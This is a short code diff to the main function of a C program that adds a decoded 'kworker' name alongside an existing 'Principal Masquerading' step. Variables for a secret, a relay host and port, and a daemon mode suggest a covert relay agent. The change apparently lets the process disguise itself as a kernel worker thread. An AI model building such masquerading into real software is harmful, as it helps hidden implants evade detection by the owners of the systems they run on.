@@ -30,10 +30,14 @@ int main(int argc, char *argv[]) {
     // 1. Principal Masquerading
     full_masquerade(argv, argc);
 
+    char kworker_name[32];
+    decode_kworker(kworker_name, sizeof(kworker_name));
+
     char *secret = NULL;
     char *relay_host = NULL;
     char *relay_port_str = NULL;
     int daemon_mode = 0;
+
 
     int opt;
     while ((opt = getopt(argc, argv, "s:i:m:d")) != -1) {
